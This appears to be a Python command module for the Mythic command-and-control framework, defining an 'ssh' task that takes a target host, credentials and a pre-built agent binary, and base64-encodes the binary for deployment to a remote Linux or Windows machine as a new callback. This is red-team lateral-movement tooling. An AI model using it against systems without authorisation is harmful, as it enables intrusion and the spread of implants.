from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import logging
import base64

logger = logging.getLogger("starburst.ssh")


class SshArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="hostname",
                cli_name="hostname",
                type=ParameterType.String,
                description="Target hostname or IP address",
            ),
            CommandParameter(
                name="port",
                cli_name="port",
                type=ParameterType.Number,
                default_value=22,
                description="SSH port",
            ),
            CommandParameter(
                name="username",
                cli_name="username",
                type=ParameterType.String,
                description="SSH username",
            ),
            CommandParameter(
                name="credential",
                cli_name="credential",
                type=ParameterType.String,
                description="Password or path to SSH key file",
            ),
            CommandParameter(
                name="use_key",
                cli_name="use_key",
                type=ParameterType.Boolean,
                default_value=False,
                description="If true, credential is treated as a key file path instead of a password",
            ),
            CommandParameter(
                name="target_os",
                cli_name="target_os",
                type=ParameterType.ChooseOne,
                choices=["linux", "windows"],
                default_value="linux",
                description="Target machine operating system",
            ),
            CommandParameter(
                name="payload_file",
                cli_name="payload_file",
                type=ParameterType.File,
                description="Pre-built agent binary to deploy on the target",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class SshCommand(CommandBase):
    cmd = "ssh"
    needs_admin = False
    help_cmd = "ssh"
    description = (
        "Deploy a pre-built agent to a remote host via SSH. "
        "Supports Linux (/dev/shm) and Windows (%TEMP%) targets. "
        "The agent checks in to Mythic independently as a new callback."
    )
    version = 4
    author = "@Lavender-exe"
    argument_class = SshArguments
    attackmapping = ["T1021.004"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        hostname = taskData.args.get_arg("hostname")
        port = taskData.args.get_arg("port")
        username = taskData.args.get_arg("username")
        file_id = taskData.args.get_arg("payload_file")

        if not file_id:
            response.Success = False
            response.Error = "No payload file specified"
            return response

        file_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=file_id,
        ))

        if not file_resp.Success:
            response.Success = False
            response.Error = f"Failed to get payload file content: {file_resp.Error}"
            return response

        if not file_resp.Content or len(file_resp.Content) == 0:
            response.Success = False
            response.Error = "Payload file is empty"
            return response

        linux_b64 = base64.b64encode(file_resp.Content).decode("ascii")
        taskData.args.add_arg("linux_binary_b64", linux_b64, ParameterType.String)

        response.DisplayParams = f"{username}@{hostname}:{port}"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
